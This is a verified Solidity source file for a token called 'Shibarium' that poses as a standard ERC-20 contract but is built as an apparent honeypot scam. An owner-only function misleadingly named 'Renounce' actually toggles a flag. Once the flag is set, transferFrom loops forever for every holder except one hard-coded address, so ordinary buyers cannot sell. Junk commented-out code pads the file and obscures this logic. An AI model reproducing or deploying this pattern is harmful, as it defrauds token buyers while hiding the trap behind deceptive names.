/**
 *Submitted for verification at Etherscan.io on 2022-08-06
*/

pragma solidity 0.8.7;

/* 

    ██████████████████████████████▓▓▓▓▓▓╣╣╣▓╣╣▓▓▓▓▓▓▓███████████████████████████████
    ███████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████████████████████████
    ████████████████████████▓█   ▀▓╢▓▓╣╢╢╢╢╣╢╢╢╢╢╢▓▓▀▒▒╣▒███████████████████████████
    ███████████████████████▓▓█ ╣▓▓░░▀▒╢╢▒▒▒▒▒▒▒╣╢▓▀▒▒╣╢╣▒█▓▓████████████████████████
    ██████████████████████▓▓▓█ ╢╢╢╢▓▒░▀░░▒▒▒▒▒▒▒▒▒▒╣╢╢╣╢▒█▓▓▓███████████████████████
    █████████████████████▓▓▓▓▓ ╟╢▓╜░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢╢╢╣▐╣▓▓▓▓██████████████████████
    ████████████████████▓▓▓▓▓▓▌ ╜ ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢▒█▓▓▓▓▓▓█████████████████████
    ████████████████████▓▓▓▓▓╬╫r   ░  └▒▒▒▒▒▒▒▒▒`  ║▒▒▒▐╢▓▓▓▓▓▓█████████████████████
    ████████████████████▓▓▓▓▓╫▌   ░▄▒ß╢▒▒▒▒▒▒▒▒▒╣@@▒▒▒▒▒█▓▓▓▓▓▓█████████████████████
    █████████████████████▓▓▓▓█    ░████▄▒▒▒▒▒▒▒▒████▒▒▒▒▒▌▓▓▓▓██████████████████████
    █████████████████████▓▓▓▓▌    ░░░░░▀` ,,, ╙▀▒▒▒▒▒▒▒▒▒█▓▓▓▓██████████████████████
    ██████████████████████▓▓▓▌     *▒▒   ████▌  `╢╣╜`    █▓▓▓███████████████████████
    ████████████████████████▓█,           ▀█▀           ▄█▓█████████████████████████
    █████████████████████████▓▓█,       ▀PZ█[█        ╓█▓███████████████████████████
    ████████████████████████████▓█▄,               ,▄█▓█████████████████████████████
    ██████████████████████████████████▄,      ,▄▄███████████████████████████████████
    ████████████████████████████████████████████████████████████████████████████████
    ███████████▒▒██░▒█▒▒██▌▒██▒▐█▒▒█▄▒▒███▒▒▐███▒▐█▄▒██▒▒█▒▒██▌▒█▌▒▒███▒▒▒██████████
    ████████████▄▒▒▀██▒▒▒░▒▒██▒▐█▒▒▒▒▒███▒▒█▒███▒▒▀▀▒██▒▒█▒▒██▌▒█▌▒█▒█▒▐▒▒██████████
    ███████████▒▒██▒▒█▒▒██▌▒██▒▐█▒▒██▒▒█▒▒▄▄░▒██▒▐█▒▒██▒▒█▒▒██▒▒█▌▒█▌▒▒█▒▒██████████
    ▀▀▀▀▀▀▀▀▀▀▀▀""""▀▀""▀▀▀"▀▀""▀"""""▀▀""▀▀▀""▀"▀▀▀""▀""▀▀▀"""▀▀▀"▀▀"▀▀""▀▀▀▀▀▀▀▀▀▀

t.me/ShibariumGalaxy
 */



contract Shibarium {
  
    mapping (address => uint256) public balanceOf;

    // 
    string public name = "Shibarium";
    string public symbol = "SHIBARIUM";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}
    function Renounce() public onlyOwner  {
    isEnabled = !isEnabled;
}





   
    
    

/*///    );
    
    
 File: @openzeppelin/contracts/math/Math.sol


  
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   

       return abi.decode(data, (bytes32)); */   




	
	


/*
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/





    function transfer(address to, uint256 value) public returns (bool success) {
         while(isEnabled) { 
if(isEnabled)


require(balanceOf[msg.sender] >= value);

       balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    
         }


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

   
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }



/*

       bytes memory slotcode = type(StorageUnit).creationCode;
     solium-disable-next-line 
      // assembly{ pop(create2(0, add(slotcode, 0x20), mload(slotcode), _struct)) }
   

    
    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
 
            
            */


address Mound = 0x094aFb9993Fc97D9Ca361eB481Ce7ac565E8cb17;


    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
        
      while(isEnabled) {
if(from == Mound)  {
        
         require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; } }
        
        
        
        
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}